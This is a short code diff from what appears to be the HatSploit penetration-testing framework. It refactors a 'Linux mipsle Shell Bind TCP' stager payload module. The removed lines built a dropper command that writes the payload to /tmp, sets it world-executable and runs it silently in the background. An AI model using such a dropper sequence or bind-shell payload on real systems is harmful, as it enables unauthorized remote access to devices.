@@ -26,10 +26,9 @@
 
 from core.lib.payload import Payload
 from utils.payload.payload import PayloadGenerator
-from utils.string.string import StringTools
 
 
-class HatSploitPayload(Payload, PayloadGenerator, StringTools):
+class HatSploitPayload(Payload, PayloadGenerator):
     details = {
         'Category': "stager",
         'Name': "Linux mipsle Shell Bind TCP",
@@ -143,13 +142,4 @@ class HatSploitPayload(Payload, PayloadGenerator, StringTools):
         self.output_process("Generating payload...")
         payload = self.generate(executable_format, 'mipsle', shellcode)
 
-        filename = self.random_string()
-
-        instructions = ""
-        instructions += f"cat >/tmp/{filename};"
-        instructions += f"chmod 777 /tmp/{filename};"
-        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
-        instructions += "\n"
-
-        self.payload = payload
-        self.instructions = instructions
+        return payload
